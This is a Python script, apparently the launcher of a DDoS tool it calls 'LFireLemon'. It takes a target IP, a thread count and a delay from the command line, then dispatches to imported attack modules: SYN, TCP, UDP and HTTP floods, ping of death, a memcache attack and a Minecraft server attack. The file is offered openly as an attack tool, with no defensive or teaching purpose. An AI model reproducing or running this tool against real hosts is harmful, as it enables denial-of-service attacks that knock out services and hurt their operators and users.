from scripts.layer_3.LemonSqueezy import LemonSqueezy
from scripts.layer_3.ping_of_death import PingOfDeath
from scripts.layer_4.syn_flood import SynFlood
from scripts.layer_4.tcp_flood import TCP
from scripts.layer_4.udp_flood import UDP
from scripts.layer_4.minecraft import Minecraft
from scripts.layer_7.http_flood import HttpAttack
from scripts.layer_7.memcache import MemCache
from colorama import init, Fore, Back, Style
from banner import Banner
import argparse
import inspect
import platform
import json
import time
import os

init(autoreset=True)

print(chr(27) + "[2J")

Banner().print_banner()

parser = argparse.ArgumentParser(description = "LFireLemon is an advanced ddos tool powered by python's most powerful frameworks such as Scapy, requests, socket and socks")

parser.add_argument('--SCRIPT', '--S', type = str, help = 'Attack Script', required = True)
parser.add_argument('--TARGET', '--H', type = str, help = 'Target IP', required = True)
parser.add_argument('--THREADS', '--T', type = int, default = '5', help = 'Number of Threads')
parser.add_argument('--SLEEPTIME', '--ST', type = int, default = '1', help = 'Time sleep')
# parser.add_argument('--INFORMATION', '--I', help = 'Threading', action = 'store_true')

arguments = parser.parse_args()

host = arguments.TARGET
sleep_time = arguments.SLEEPTIME
threading_count = arguments.THREADS

config = {

    "HOST" : host,

    "THREADS" : threading_count,

    "SLEEP" : sleep_time,
}

json_object = json.dumps(config, indent=4)


def attack_by_method(method_name):

    json_object = json.dumps(config, indent=4)

    with open(os.path.dirname(inspect.getsourcefile(method_name)) + "\\attack_config.json", "w") as outfile:
        outfile.write(json_object)

    method_name().get_info()

    time.sleep(2)

    input(Fore.MAGENTA + "Press Enter when you're ready!" + Fore.WHITE)

    method_name().attack()


if __name__ == "__main__":

    if arguments.SCRIPT == "http_flood":
        attack_by_method(HttpAttack)

    elif arguments.SCRIPT == "lemon_squeezy":
        attack_by_method(LemonSqueezy)

    elif arguments.SCRIPT == "ping_of_death":
        attack_by_method(PingOfDeath)

    elif arguments.SCRIPT == "syn_flood":
        attack_by_method(SynFlood)

    elif arguments.SCRIPT == "tcp_flood":
        attack_by_method(TCP)

    elif arguments.SCRIPT == "udp_flood":
        attack_by_method(UDP)

    elif arguments.SCRIPT == "minecraft":
        attack_by_method(Minecraft)

    elif arguments.SCRIPT == "memcache":
        attack_by_method(MemCache)

    else:
        print("attack is not defined!")
